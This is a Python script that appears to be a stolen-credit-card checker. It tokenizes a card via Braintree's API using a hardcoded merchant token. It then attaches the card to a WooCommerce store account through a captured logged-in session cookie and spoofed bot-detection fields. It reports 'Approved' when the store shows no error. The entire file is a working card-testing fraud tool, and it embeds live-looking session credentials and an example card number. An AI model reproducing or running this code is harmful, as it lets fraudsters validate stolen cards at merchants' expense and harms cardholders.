import requests
from bs4 import BeautifulSoup

def Fele(ccx):
    ccx = ccx.strip()
    
    # Step 1: Parse CC Details
    try:
        n, mm, yy, cvc = ccx.split("|")
    except ValueError:
        print("Invalid card format. Use: '1234567890123456|MM|YY|CVC'")
        return None

    # Step 2: Tokenize CC using Braintree
    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTYzODIzMzgsImp0aSI6ImZjNTI3MTAwLTIyZmEtNDM4Yy1hNzU1LWFiYjA2YmRjOWVmYSIsInN1YiI6InNwNzljY3NnOWZyaHpoOW0iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InNwNzljY3NnOWZyaHpoOW0iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.MnKMf6d5CciDf0WfTlQZWXFExXBr0r_nApN5JIeCdasdsQd2gsP4S2K8ZfdoT6zRp9LDLqKA4_vWeRX0HzyeJw',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'unique-session-id'
        },
        'query': '''
            mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   
                tokenizeCreditCard(input: $input) {     
                    token     
                    creditCard {       
                        bin       
                        brandCode       
                        last4       
                        expirationMonth      
                        expirationYear      
                        binData {         
                            issuingBank         
                            countryOfIssuance         
                        }     
                    }   
                } 
            }
        ''',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    
    if response.status_code != 200:
        print("Braintree Tokenization Failed:", response.status_code, response.text)
        return None

    try:
        data = response.json()
        token = data["data"]["tokenizeCreditCard"]["token"]
        print("Tokenized Card ID:", token)
    except (KeyError, TypeError):
        print("Error: Could not extract token from response.")
        return None

    # Step 3: Add Tokenized Payment Method to InfiniteDiscsVIPClub
    cookies = {
    'wp_automatewoo_visitor_d5aad6c75ecd0a07b76adeadc7521e91': 'pl06tl5axijwa5byzxo6',
    'INGRESSCOOKIE': '1756197866.048.41773.583908|9a02b580b0cdc0e1c8cd4d3e9c8d150e',
    '_ga': 'GA1.1.1587936366.1756197869',
    'wordpress_logged_in_d5aad6c75ecd0a07b76adeadc7521e91': 'magira3101%7C1757407619%7CFxLm8oT9eHM2uVjR2Z8pvnjzBI5Eu4R2xZt7bLAU57L%7C5a0061cb1fdb6314d781001124d8b1a047137fc57d11d102a85bc04b47f93126',
    '_ga_QDLNVRKG78': 'GS2.1.s1756197868$o1$g1$t1756198024$j40$l0$h0',
    'wp_automatewoo_session_started': '1',
    '__cf_bm': '8KZGvkTogzTraqaGwuTC.RC0K2BKmGToGYGSJsgKfrc-1756295912-1.0.1.1-vko2ez2U9ajCUjNLxzDwgfGwHVHj8IyhYv5G5ViNVquihxXLqa9Y38tHiUU76DMl23Ez8zPvYGX8E1COeYTZgUO8FrM077ocO8ZYOvMeg4k',
}

    headers = {
    'authority': 'infinitediscsvipclub.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    
    'origin': 'https://infinitediscsvipclub.com',
    'referer': 'https://infinitediscsvipclub.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce', token),
    ('wc_braintree_device_data', '{"correlation_id":"76b5fd99bf6ee57673a61010d72ccab5"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"76b5fd99bf6ee57673a61010d72ccab5"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', '9d22b5a2ee'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
    ('ct_bot_detector_event_token', '0f3f742443abcb33ce44c78c1a7ab2ad4c74f35f7af20f67d9c4b28a36d0bccd'),
    ('apbct_visible_fields', 'eyIwIjp7InZpc2libGVfZmllbGRzIjoiIiwidmlzaWJsZV9maWVsZHNfY291bnQiOjAsImludmlzaWJsZV9maWVsZHMiOiJ3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtY2FyZC10eXBlIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtZW5hYmxlZCB3Yy1icmFpbnRyZWUtY3JlZGl0LWNhcmQtM2Qtc2VjdXJlLXZlcmlmaWVkIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC0zZC1zZWN1cmUtb3JkZXItdG90YWwgd2NfYnJhaW50cmVlX2NyZWRpdF9jYXJkX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1jcmVkaXQtY2FyZC10b2tlbml6ZS1wYXltZW50LW1ldGhvZCB3Y19icmFpbnRyZWVfcGF5cGFsX3BheW1lbnRfbm9uY2Ugd2NfYnJhaW50cmVlX2RldmljZV9kYXRhIHdjLWJyYWludHJlZS1wYXlwYWwtY29udGV4dCB3Y19icmFpbnRyZWVfcGF5cGFsX2Ftb3VudCB3Y19icmFpbnRyZWVfcGF5cGFsX2N1cnJlbmN5IHdjX2JyYWludHJlZV9wYXlwYWxfbG9jYWxlIHdjLWJyYWludHJlZS1wYXlwYWwtdG9rZW5pemUtcGF5bWVudC1tZXRob2Qgd29vY29tbWVyY2UtYWRkLXBheW1lbnQtbWV0aG9kLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgd29vY29tbWVyY2VfYWRkX3BheW1lbnRfbWV0aG9kIGN0X2JvdF9kZXRlY3Rvcl9ldmVudF90b2tlbiIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjE4fX0='),
]

    response = requests.post('https://infinitediscsvipclub.com/my-account/add-payment-method/', headers=headers, cookies=cookies, data=data)



# Check if specific message exists in the response text
    if "Please wait for 20 seconds" in response.text:
        print("spammed detect")
        return "Spam Detected"
    else:
        soup = BeautifulSoup(response.text, "html.parser")
        message_div = soup.find("div", class_="message-container container alert-color medium-text-center")

        if message_div:
            #print(message_div.get_text(strip=True))
            return message_div.get_text(strip=True)
        else:
            #print("1000: Approved")
            return "1000:Approved"
# Example Usage:

#print(Tele("4258810718226890|02|2027|653"))        
